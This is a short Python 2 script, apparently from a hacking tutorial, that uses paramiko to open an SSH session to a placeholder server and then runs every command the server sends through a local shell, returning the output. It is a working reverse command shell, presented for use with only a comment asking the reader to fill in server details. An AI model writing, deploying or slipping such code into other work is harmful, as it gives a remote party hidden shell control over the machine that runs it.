"""
This script is a modification of the previous ssh client script, 
because if we use the previous script it doesn't work well on Windows because on Windows, 
it doesn't include ssh
"""

import threading
import paramiko
import subprocess

def ssh_connect(ip,user,passwd,command):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(ip,username=user,password=passwd)
    ssh_session = client.get_transport().open_session()
    if ssh_session.active:
        ssh_session.send(command)
        print(ssh_session.recv(1024))
        while True:
            command = ssh_session.recv(1024)
            try:
                cmd_output = subprocess.check_output(command,shell=True)
                ssh_session.send(cmd_output)
            except Exception,e:
                ssh_session.send(str(e))
        client.close()
    return

#please replace this parameter, with you'r infomation ssh server
ssh_connect('ip_address','username','password','id')